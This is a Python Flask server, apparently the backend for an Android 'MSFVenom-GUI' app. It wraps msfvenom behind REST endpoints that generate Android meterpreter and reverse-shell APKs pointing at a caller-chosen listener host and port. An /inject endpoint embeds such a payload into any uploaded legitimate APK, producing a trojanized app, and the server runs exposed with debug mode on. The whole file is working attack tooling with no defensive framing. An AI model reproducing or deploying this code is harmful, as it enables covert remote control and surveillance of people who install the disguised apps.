#!/usr/bin/env python3
"""
MSFVenom Server - Companion server for MSFVenom-GUI Android app
This server provides a REST API to generate msfvenom payloads
"""

import os
import subprocess
import tempfile
import time
from flask import Flask, request, send_file, jsonify
from werkzeug.utils import secure_filename
import logging

app = Flask(__name__)
app.logger.setLevel(logging.INFO)

# Configuration
UPLOAD_FOLDER = '/tmp/msfvenom_uploads'
OUTPUT_FOLDER = '/tmp/msfvenom_output'
ALLOWED_EXTENSIONS = {'apk'}

# Create directories if they don't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def validate_payload(payload):
    """Validate that the payload is safe and supported"""
    allowed_payloads = [
        'android/meterpreter/reverse_tcp',
        'android/meterpreter/reverse_https',
        'android/shell/reverse_tcp',
        'android/shell/reverse_https'
    ]
    return payload in allowed_payloads

def validate_ip(ip):
    """Basic IP validation"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    except ValueError:
        return False

def validate_port(port):
    """Basic port validation"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

@app.route('/status', methods=['GET'])
def status():
    """Health check endpoint"""
    return jsonify({
        'status': 'online',
        'message': 'MSFVenom Server is running',
        'timestamp': time.time()
    })

@app.route('/generate', methods=['GET'])
def generate_payload():
    """Generate msfvenom payload"""
    try:
        # Get parameters
        payload = request.args.get('payload', '')
        lhost = request.args.get('lhost', '')
        lport = request.args.get('lport', '')
        format_type = request.args.get('format', 'apk')

        # Validate parameters
        if not payload or not lhost or not lport:
            return jsonify({'error': 'Missing required parameters: payload, lhost, lport'}), 400

        if not validate_payload(payload):
            return jsonify({'error': 'Invalid or unsupported payload'}), 400

        if not validate_ip(lhost):
            return jsonify({'error': 'Invalid IP address format'}), 400

        if not validate_port(lport):
            return jsonify({'error': 'Invalid port number'}), 400

        # Generate unique filename
        timestamp = int(time.time())
        output_filename = f"payload_{timestamp}.{format_type}"
        output_path = os.path.join(OUTPUT_FOLDER, output_filename)

        # Construct msfvenom command
        cmd = [
            'msfvenom',
            '-p', payload,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format_type,
            '-o', output_path
        ]

        app.logger.info(f"Executing command: {' '.join(cmd)}")

        # Execute msfvenom
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        if result.returncode != 0:
            app.logger.error(f"msfvenom failed: {result.stderr}")
            return jsonify({
                'error': 'Payload generation failed',
                'details': result.stderr
            }), 500

        # Check if file was created
        if not os.path.exists(output_path):
            return jsonify({'error': 'Payload file was not created'}), 500

        app.logger.info(f"Payload generated successfully: {output_path}")

        # Return the file
        return send_file(
            output_path,
            as_attachment=True,
            download_name=output_filename,
            mimetype='application/vnd.android.package-archive'
        )

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Payload generation timed out'}), 500
    except Exception as e:
        app.logger.error(f"Unexpected error: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

@app.route('/inject', methods=['POST'])
def inject_payload():
    """Inject payload into existing APK"""
    try:
        # Check if file was uploaded
        if 'apk' not in request.files:
            return jsonify({'error': 'No APK file uploaded'}), 400

        file = request.files['apk']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400

        if not allowed_file(file.filename):
            return jsonify({'error': 'Invalid file type. Only APK files allowed'}), 400

        # Get parameters
        payload = request.form.get('payload', 'android/meterpreter/reverse_tcp')
        lhost = request.form.get('lhost', '')
        lport = request.form.get('lport', '')

        # Validate parameters
        if not lhost or not lport:
            return jsonify({'error': 'Missing required parameters: lhost, lport'}), 400

        if not validate_payload(payload):
            return jsonify({'error': 'Invalid or unsupported payload'}), 400

        if not validate_ip(lhost):
            return jsonify({'error': 'Invalid IP address format'}), 400

        if not validate_port(lport):
            return jsonify({'error': 'Invalid port number'}), 400

        # Save uploaded file
        filename = secure_filename(file.filename)
        timestamp = int(time.time())
        input_path = os.path.join(UPLOAD_FOLDER, f"{timestamp}_{filename}")
        file.save(input_path)

        # Generate output filename
        output_filename = f"injected_{timestamp}.apk"
        output_path = os.path.join(OUTPUT_FOLDER, output_filename)

        # Construct msfvenom command for APK injection
        cmd = [
            'msfvenom',
            '-p', payload,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-x', input_path,
            '-f', 'apk',
            '-o', output_path
        ]

        app.logger.info(f"Executing injection command: {' '.join(cmd)}")

        # Execute msfvenom
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        # Clean up input file
        try:
            os.remove(input_path)
        except:
            pass

        if result.returncode != 0:
            app.logger.error(f"msfvenom injection failed: {result.stderr}")
            return jsonify({
                'error': 'Payload injection failed',
                'details': result.stderr
            }), 500

        # Check if file was created
        if not os.path.exists(output_path):
            return jsonify({'error': 'Injected APK file was not created'}), 500

        app.logger.info(f"Payload injected successfully: {output_path}")

        # Return the file
        return send_file(
            output_path,
            as_attachment=True,
            download_name=output_filename,
            mimetype='application/vnd.android.package-archive'
        )

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Payload injection timed out'}), 500
    except Exception as e:
        app.logger.error(f"Unexpected error: {str(e)}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

@app.route('/payloads', methods=['GET'])
def list_payloads():
    """List available payloads"""
    payloads = [
        'android/meterpreter/reverse_tcp',
        'android/meterpreter/reverse_https',
        'android/shell/reverse_tcp',
        'android/shell/reverse_https'
    ]
    return jsonify({'payloads': payloads})

if __name__ == '__main__':
    print("Starting MSFVenom Server...")
    print("Make sure msfvenom is installed and accessible in PATH")
    print("Server will be available at http://localhost:8080")
    print("API Endpoints:")
    print("  GET  /status - Health check")
    print("  GET  /generate - Generate payload")
    print("  POST /inject - Inject payload into APK")
    print("  GET  /payloads - List available payloads")

    app.run(host='0.0.0.0', port=8080, debug=True)
